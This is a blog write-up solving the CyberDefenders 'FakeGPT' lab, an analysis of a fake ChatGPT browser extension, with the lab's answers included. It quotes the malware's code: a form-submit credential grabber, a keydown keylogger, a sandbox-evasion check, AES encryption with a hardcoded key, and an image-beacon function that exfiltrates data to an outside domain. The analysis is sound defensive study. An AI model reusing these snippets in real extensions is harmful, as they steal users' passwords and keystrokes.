---
author: Ricard Alcaraz
title: FakeGPT Lab - CyberDefenders
tags:
  - Cybersecurity
  - Blue Team
  - CyberDefenders
  - Malware Analysis
languages:
  - malwareanalysis
  - javascript
  - cyberchef
image:
  url: https://cyberdefenders.org/media/terraform/FakeGPT/FakeGPT.webp
  alt: fake gpt image
description: My notes solving FakeGPT Lab - CyberDefenders
pubDate: 2025-08-27T17:47:00.000+02:00
heroImage: https://cyberdefenders.org/media/terraform/FakeGPT/FakeGPT.webp
---
## Scenario
Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.

Your task is to perform a thorough analysis of this extension identify its malicious components.

## Documents Provided
- app.js
- crypto.js
- img.GIF
- loader.js
- manifest.json
- ui.html

## Q1: Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?

We have several files to check, the ones I looked at first where the ones that could potentially have some sort of obscure target URLs.
Looking at app.js I found this:
```javascript
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```
When I saw the "==" at the end of the string I thought about one particular encoding, I used CyberChef and the result was `www.facebook.com`, so we just found the encoding method.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Base64
  </div>
</details>

## Q2: Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?

I found it in the previous question by decoding the Base64 string.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    www.facebook.com
  </div>
</details>

 ## Q3: Which type of HTML element is utilized by the extension to send stolen data?

Here I was looking for for something related to sending data, it was not hard since the functions have a good naming. We can take a look at the function `sendToServer` and we will find the element used to send data.
```javascript
function sendToServer(encryptedData) {
  var img = new Image();
  img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
  document.body.appendChild(img);
}
```

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    &#60;img>
  </div>
</details>

## Q4: What is the first specific condition in the code that triggers the extension to deactivate itself?

Now we should check the other `.js` files, because `app.js` doesn't seem to have anything related. Checking `loader.js` we can see again a little help from the developer.

```javascript
if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
  alert("Virtual environment detected. Extension will disable itself.");
  chrome.runtime.onMessage.addListener(() => { return false; });
}
```
This alert explains that it will disable itself, if the condition is fullfilled. The condition that has to be fullfilled is one or the other separated by the or "||", in this case the question asks for the first condition.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    navigator.plugins.length === 0
  </div>
</details>

## Q5: Which event does the extension capture to track user input submitted through forms?

I had to comeback to `app.js`, now looking for an event and a form. And I found this part:
```javascript
document.addEventListener('submit', function(event) {
  let form = event.target;
  let formData = new FormData(form);
  let username = formData.get('username') || formData.get('email');
  let password = formData.get('password');
  ...
```
The event that the extension captures is `submit` to track the user input through the form, that has two inputs, an user (or email) and a password, and if both are filled it will call the function `exfiltrateCredentials` with both parameters.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    submit
  </div>
</details>

## Q6: Which API or method does the extension use to capture and monitor user keystrokes?

In the same file `app.js` just after the section of the code I previously mentioned we can see another event capture:
```javascript
document.addEventListener('keydown', function(event) {
  var key = event.key;
  exfiltrateData('keystroke', key);
});
```
In this case a `keydown` event that calls to the function `exfiltrateData`.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    keydown
  </div>
</details>

## Q7: What is the domain where the extension transmits the exfiltrated data?

We already know this information from the question **Q3** where I shared the piece of code of the function `sendToServer`.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Mo.Elshaheedy.com
  </div>
</details>

## Q8: Which function in the code is used to exfiltrate user credentials, including the username and password?

Also I mentioned this function in the **Q5** so coming back to that piece of code will give us the information, care with the final ";" maybe in JS is not needed but it is for the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    exfiltrateCredentials(username, password);
  </div>
</details>

## Q9: Which encryption algorithm is applied to secure the data before sending?

Now, we should check for anything related to encryption algorithms, in the same file we can see a function with the name `encryptPayload` which seems related to the question, taking a look at it it uses the library `CryptoJS`, and now we can check where the `.encrypt()` is used. In this case we can see this:
```javascript
    const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
```
So the encryption algorithm is AES, and also we can see that is using custom key and IV, where the key is `SuperSecretKey123` and a randomly generated IV.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    AES
  </div>
</details>

## Q10: What does the extension access to store or manipulate session-related data and authentication information?

We have to take a look to another file to get this one, in this case it's interesting to take a look at `manifest.json` in this configuration file we can see a parameter about the `permissions`:
```json
"permissions": [
  "tabs",
  "http://*/*",
  "https://*/*",
  "storage",
  "webRequest",
  "webRequestBlocking",
  "cookies"
  ]
```

And one that seems related to the question is the value which is a session-related data and authentication information, so this is the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    cookies
  </div>
</details>

